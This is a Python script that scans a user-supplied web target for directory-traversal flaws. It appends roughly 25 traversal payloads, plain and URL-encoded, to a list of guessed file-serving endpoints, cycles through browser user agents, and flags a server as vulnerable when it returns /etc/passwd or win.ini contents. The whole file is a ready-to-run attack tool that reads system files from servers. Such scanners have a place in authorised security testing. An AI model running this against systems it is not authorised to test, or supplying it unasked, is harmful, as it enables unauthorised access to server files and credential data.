import requests
from colorama import Fore, Style, init


init()


base_url = input("Enter the base URL of the target (e.g., http://example.com): ").rstrip("/")

# List of potential vulnerable endpoints
endpoints = [
    "",  # Empty endpoint
    "/download?file=",
    "/view?file=",
    "/show_image?img=",
    "/get_file?path=",
    "/open?document=",
    "/load?file=",
    "/read?file=",
    "/retrieve?file=",
    "/serve?file=",
    "/fetch?file="
]

# List of payloads for directory traversal
payloads = [
    "../../../../etc/passwd",
    "../../../../../../../../etc/passwd",
    "../../../../../../../../../etc/passwd",
    "../../../../../../../../../../etc/passwd",
    "../../../../../windows/win.ini",
    "../../../../../boot.ini",
    "../../../../../WINDOWS/system32/drivers/etc/hosts",
    "../../../../../WINDOWS/system32/config/system",
    "../../../../../../../../../windows/win.ini",
    "../../../../../../../../../windows/system32/drivers/etc/hosts",
    "../../../../../../../../../windows/system32/config/system",
    "../" * 10 + "etc/passwd",
    "../" * 10 + "windows/win.ini",
    "../" * 10 + "boot.ini",
    "../" * 10 + "WINDOWS/system32/drivers/etc/hosts",
    "../" * 10 + "WINDOWS/system32/config/system",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fwindows%2fwin.ini",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot.ini",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fWINDOWS%2fsystem32%2fdrivers%2fetc%2fhosts",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fWINDOWS%2fsystem32%2fconfig%2fsystem",
    "..%2f..%2f..%2f..%2fetc/passwd",
    "..%2f..%2f..%2f..%2fwindows%2fwin.ini",
    "..%2f..%2f..%2f..%2fboot.ini",
    "%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
]

# List of user agents to simulate different clients
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0"
]


for endpoint in endpoints:
    for payload in payloads:
        for user_agent in user_agents:
            headers = {
                "User-Agent": user_agent,
            }
            
        
            test_url = f"{base_url}{endpoint}{payload}"
            print(Fore.YELLOW + f"\nTesting" + Fore.RESET + f": {test_url}\n with User-Agent: {user_agent}")
            
            try:
                # Send the request
                response = requests.get(test_url, headers=headers)
                
                # Check the response
                if response.status_code == 200:
                    if "root:x:0:0:root" in response.text or "[extensions]" in response.text:
                        print(Fore.GREEN + f"\nVulnerable: {test_url}" + Style.RESET_ALL)
                    else:
                        print(Fore.RED + f"\nNot Vulnerable: {test_url}" + Style.RESET_ALL)
                else:
                    print(f"\nReceived status code {response.status_code} for {test_url}")
            
            except requests.RequestException as e:
                print(f"Error with {test_url}: {e}")

print("\nTesting completed.")
